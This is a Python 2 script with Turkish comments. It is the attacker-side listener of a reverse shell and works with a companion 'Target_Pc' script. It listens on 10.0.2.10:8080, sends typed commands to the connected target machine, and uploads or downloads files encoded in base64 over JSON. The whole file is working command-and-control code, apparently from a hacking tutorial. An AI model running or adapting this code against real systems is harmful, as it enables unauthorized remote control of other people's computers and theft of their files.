#Bu script'in calisabilmesi icin konu icerisinden Target_Pc adli script'in de bulunup gerekli islemlerin yapilmasi lazimdir!!
import socket
import json #Verilerin paket olarak yollanmasini saglar. Bu sayede yuksek boyutlu verilerin icerigine tek seferde ulasilabilir.
import base64
class SocketListener:
    def __init__(self,ip,port):
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)  # Surekli olarak bu listener ile baglanti icinde olunacagini belirtmek icin kullanilir
        my_listener.bind((ip, port))  # Listener'in dinleyecegi yerin adresi ve port numarasi verilir.
        my_listener.listen(0)  # Dinleme islemi baslatildi.
        print("Listening..")
        (self.my_connection,my_ipaddress) = my_listener.accept()  # Dinleme islemi baslatildiktan sonra bir baglanti gelirse kabul etmek icin kullanilir
        print("Connection OK from " + str(my_ipaddress))

    def json_send(self,data):
        json_data = json.dumps(data)
        self.my_connection.send(json_data)

    def json_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def komut_uygulama(self,command_input):
        self.json_send(command_input)
        if command_input[0] == "quit":#Programi hem target pc'de hem de saldiran pc'de kapatmak icin kullanilir komut satirina quit yazmak yeterlidir.
            self.my_connection.close()
            exit()
        return self.json_recieve()

    def write_file(self,isim,icerik): #Hedef dosyanin icerigini indirmemizi saglar
        with open(isim,"wb") as my_file:#wb dosyanin binary olarak yazilmasini saglar.Bu islem sadece txt dosyalarini degil diger uzantili dosyalarin da icerigini yazabilmemizi saglar
            my_file.write(base64.b64decode(icerik)) #ozel karakterleri de yazdirabilmemizi saglar
            return "Download tamamlandi"
    def read_file(self,isim):
        with open(isim,"rb") as my_file:
            return base64.b64encode(my_file.read())

    def Loop(self):
        while True:
            command_input = raw_input("Komut giriniz: ")
            command_input = command_input.split(" ")
            try:
                if command_input[0] == "upload":
                    my_file_icerik = self.read_file(command_input[1])
                    command_input.append(my_file_icerik)

                command_output = self.komut_uygulama(command_input)

                if command_input[0] == "download" and "Error!" not in command_output :
                    command_output = self.write_file(command_input[1],command_output)
            except Exception:
                command_output = "Error!"

            print(command_output)

socket_listener = SocketListener("10.0.2.10",8080)
socket_listener.Loop()
